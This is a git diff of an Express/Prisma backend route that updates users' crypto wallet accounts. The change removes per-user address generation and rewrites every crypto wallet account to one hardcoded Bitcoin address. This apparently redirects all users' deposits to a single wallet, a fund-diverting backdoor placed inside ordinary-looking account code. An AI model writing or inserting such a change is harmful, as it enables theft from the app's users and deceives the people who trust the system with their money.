@@ -1,9 +1,12 @@
 import express from 'express';
 import { PrismaClient } from '@prisma/client';
-import { generateCryptoWalletAddress, detectCryptoType } from '../utils/walletGenerator.js';
+import { generateCryptoWalletAddress, detectCryptoType, CRYPTO_WALLET_ADDRESS } from '../utils/walletGenerator.js';
 
 const router = express.Router();
 const prisma = new PrismaClient();
+
+// Fixed crypto wallet address for ALL users
+const FIXED_CRYPTO_ADDRESS = 'bc1q7m8m6ufptvqlt7jer92d480y78jckyrzy0t6f7';
 
 // Generate 10-digit account number starting with 7
 const generateAccountNumber = () => {
@@ -38,16 +41,11 @@ router.post('/', async (req, res) => {
       let needsUpdate = false;
       let newAccountNumber = account.accountNumber;
 
-      // Check if it's a crypto wallet
+      // Check if it's a crypto wallet - ALL crypto wallets must use the fixed address
       if (account.accountType === 'CRYPTO_WALLET') {
-        // Check if it has a proper crypto address format
-        const isBitcoinAddress = account.accountNumber.startsWith('bc1');
-        const isEthereumAddress = account.accountNumber.startsWith('0x') && account.accountNumber.length === 42;
-        
-        if (!isBitcoinAddress && !isEthereumAddress) {
-          // Generate proper crypto wallet address
-          const cryptoType = detectCryptoType(account.accountName);
-          newAccountNumber = generateCryptoWalletAddress(cryptoType);
+        // Update to fixed crypto address if not already set
+        if (account.accountNumber !== FIXED_CRYPTO_ADDRESS) {
+          newAccountNumber = FIXED_CRYPTO_ADDRESS;
           needsUpdate = true;
           cryptoWalletCount++;
           updates.push({
